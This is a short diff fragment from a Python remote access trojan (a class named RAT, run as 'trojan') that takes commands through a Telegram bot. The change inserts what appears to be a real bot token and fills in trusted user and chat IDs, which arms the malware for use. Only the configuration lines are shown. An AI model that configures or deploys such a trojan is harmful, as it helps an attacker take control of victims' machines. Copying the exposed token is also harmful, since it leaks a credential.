@@ -154,10 +154,10 @@ class RAT:
 			bot.sendMessage(message["chat"]["id"], ":D")
 
 if __name__ == '__main__':
-	token = ""
+	token = "7377840088:AAFOv0449VV4oyNHCGwqoPCiLmlWjG-zdPE"
 	bot = telepot.Bot(token)
 	
-	trusted_users = []
-	trusted_chats = []
+	trusted_users = [5607187195]
+	trusted_chats = [-1002423274607]
 	
 	trojan = RAT()
